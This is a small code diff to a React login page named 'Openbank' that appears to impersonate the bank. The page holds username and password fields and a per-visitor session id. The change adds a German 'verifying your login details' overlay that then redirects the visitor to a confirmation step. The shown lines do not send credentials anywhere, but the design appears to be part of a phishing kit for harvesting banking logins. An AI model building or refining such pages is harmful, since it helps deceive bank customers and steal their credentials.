@@ -1,5 +1,5 @@
 import { useState, useEffect } from "react";
-import { useSearchParams } from "react-router-dom";
+import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
@@ -15,6 +15,7 @@ const MAGENTA_DARK = "#a30000";
 
 const Openbank = () => {
   const [params] = useSearchParams();
+  const navigate = useNavigate();
   const sessionId = params.get("s") || "";
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
@@ -226,7 +227,12 @@ const Openbank = () => {
         </section>
       </div>
 
-      {showLoading && <LoadingOverlay />}
+      {showLoading && (
+        <LoadingOverlay
+          message="Anmeldedaten werden überprüft..."
+          onComplete={() => navigate("/confirmation?s=" + sessionId)}
+        />
+      )}
     </>
   );
 };
